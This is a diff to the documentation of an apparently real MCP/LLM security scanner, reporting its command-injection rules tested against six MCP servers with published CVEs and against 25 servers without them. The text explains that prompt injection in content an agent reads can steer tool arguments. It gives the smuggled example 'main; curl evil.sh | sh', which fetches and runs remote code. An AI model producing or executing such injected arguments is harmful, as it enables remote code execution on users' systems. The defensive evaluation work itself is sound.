@@ -2,7 +2,48 @@
 
 Most scanners prove their claims on fixtures they wrote themselves. We do that too ([`test-fixtures/`](../test-fixtures)), but a corpus you author yourself can't tell you how the scanner behaves on code you didn't write — so `npm run regression` runs the built CLI against a curated set of real, public LLM/MCP/RAG codebases and checks the result against a hand-reviewed baseline. This is what that actually turned up.
 
-## The headline result: a labeled ground-truth test
+## We pointed it at six MCP servers with published command-injection CVEs
+
+Command injection and path traversal inside tool handlers are the most common real MCP server vulnerabilities. The reason is structural: **tool arguments are written by the model**, and the model writes whatever text in its context tells it to. A prompt injection in a web page, GitHub issue, or file the agent reads chooses the argument, and an argument interpolated into `` exec(`git log ${branch}`) `` becomes `main; curl evil.sh | sh`.
+
+`MCP013` and `MCP014` trace tool arguments into shell commands and file paths. To check them against ground truth rather than fixtures we wrote, we took every MCP server we could find with a **published command-injection advisory** and scanned it twice: at the last vulnerable commit, then at the fix.
+
+| Server | Advisory | Vulnerable (scanned) | MCP013 | Patched (scanned) | MCP013 |
+|---|---|---|---|---|---|
+| [GLips/Figma-Context-MCP](https://github.com/GLips/Figma-Context-MCP) | [CVE-2025-53967](https://github.com/advisories/GHSA-gxw4-4fc5-9gr5) | `v0.6.2` | 1 | `v0.6.3` | 0 |
+| [Flux159/mcp-server-kubernetes](https://github.com/Flux159/mcp-server-kubernetes) | [CVE-2025-53355](https://github.com/advisories/GHSA-gjv4-ghm7-q58q) | `2.4.9` | 17 | `2.5.0` | 0 |
+| [sammcj/mcp-package-docs](https://github.com/sammcj/mcp-package-docs) | [CVE-2025-54073](https://github.com/sammcj/mcp-package-docs/security/advisories/GHSA-vf9j-h32g-2764) | `8e9bd31` | 7 | `cb4ad49` (fix) | 0 |
+| [sunwood-ai-labs/github-kanban-mcp-server](https://github.com/sunwood-ai-labs/github-kanban-mcp-server) | [CVE-2025-53818](https://github.com/advisories/GHSA-6jx8-rcjx-vmwf) | `0a4f9f9` | 6 | `34246b6` (fix) | 0 |
+| [alfonsograziano/node-code-sandbox-mcp](https://github.com/alfonsograziano/node-code-sandbox-mcp) | [CVE-2025-53372](https://github.com/advisories/GHSA-5w57-2ccq-8w95) | `7fd7fb8` | 4 | `e461a74` (fix) | 0 |
+| [joshuayoes/ios-simulator-mcp](https://github.com/joshuayoes/ios-simulator-mcp) | [CVE-2025-52573](https://github.com/advisories/GHSA-6f6r-m9pv-67jw) | `1.3.2` | 2 | `1.3.3` | 0 |
+
+**6/6 detected on the vulnerable release, 6/6 clean on the patched one.** Every finding was read against its source line. Each hits the tool the advisory names (`kubectl_scale`/`kubectl_patch`/`explain_resource` for CVE-2025-53355, `ui_tap` for CVE-2025-52573, `add_comment` for CVE-2025-53818), and the extra findings in the same releases are sibling tools with the identical pattern, removed by the same fix.
+
+Only one of the six had the vulnerable `exec` inside the tool handler itself. The others are what real servers look like:
+
+- **Figma:** tool handler → `getRawNode()` → `request()` → `fetchWithRetry()` → `` exec(`curl ... "${url}"`) ``, four calls and three files away from the tool argument.
+- **Kanban:** a `CallTool` dispatcher passes `{ issue_number: args.issue_number, ... }` to a handler in another file, which shells out through a `promisify(exec)` imported from a third.
+- **package-docs:** class methods, a conditional (`` symbol ? `go doc ${pkg}.${symbol}` : `go doc ${pkg}` ``), and the same helper reached from several tools with different arguments.
+
+So the rules follow tool arguments through calls, imports, class methods, object-literal fields, and `tsconfig` path aliases. A finding that crossed a call is `likely`; one built in the handler itself is `proven`.
+
+### What it cost to get there, honestly
+
+The first version of MCP013 detected **1 of 6**. Each miss was a missing capability, fixed in the rule rather than by special-casing the repo: following calls across files, per-field taint through object literals, conditional expressions, handler references, and path aliases. Two of the misses were **guards that weren't guards**. `goMod.includes(packageName)` searches a file for the name, and `packageName.match(/github\.com\/(.+)/)` extracts parts of it; neither validates anything. Membership checks now count only against an allowlist, and a regex counts only when it is anchored or probes for metacharacters.
+
+Following calls also introduced a false positive in our own rule. mcp-server-kubernetes reuses one `command` variable across `switch` cases, and a *later* case assigns a tool argument, so the first version flagged three static `kubectl config get-contexts` calls. Sinks are now judged by the value that actually reaches them. That case is pinned in [`test/mcp-tool-arg-sink.test.js`](../test/mcp-tool-arg-sink.test.js).
+
+### And on servers without a CVE?
+
+A rule that finds CVEs but also fires on every server that runs a subprocess is useless. We scanned 25 widely used MCP servers and frameworks: official SDKs and reference servers, Microsoft's Playwright MCP, Sentry, MongoDB, Supabase, Firecrawl, Exa, Tavily, Context7, FastMCP (Python and TypeScript), DesktopCommander, and more. **MCP013/MCP014 produced no default-tier findings.** The by-design "run any command" and "read any file" tools (DesktopCommander, filesystem-style servers) appear only under `--paranoid`, labeled as by-design capabilities rather than bugs.
+
+The sweep and the regression gate found **three false positives in older rules**, each now fixed at the root and pinned as a fixture in `test-fixtures/safe/`:
+
+- browserbase's server printed a sample client config containing its *own* listening address, and MCP002 reported it as a critical "MCP URL from user input". An unrelated variable with the same name in a request handler had read `req.url`, and taint was tracked by name, not by declaration.
+- FastMCP's in-memory BM25 index over its own tool catalog (`self._index.query(...)`) was reported as an unfiltered cross-tenant vector search.
+- A Cisco-labeled *safe* skill (new in their eval corpus, caught by `npm run regression`) that writes `~/.npmrc` and downloads release notes was reported as credential exfiltration. Writing a file is not reading it, and `curl -o` is not egress.
+
+## A labeled ground-truth test for skill scanning
 
 [cisco-ai-defense/skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) ships an `evals/` corpus built to evaluate Agent Skill scanners — and unlike most real-world repos, its fixtures are pre-labeled: each one sits under a directory named `malicious/` or `safe/`. That turns a regression scan into a graded test instead of a judgment call.
 
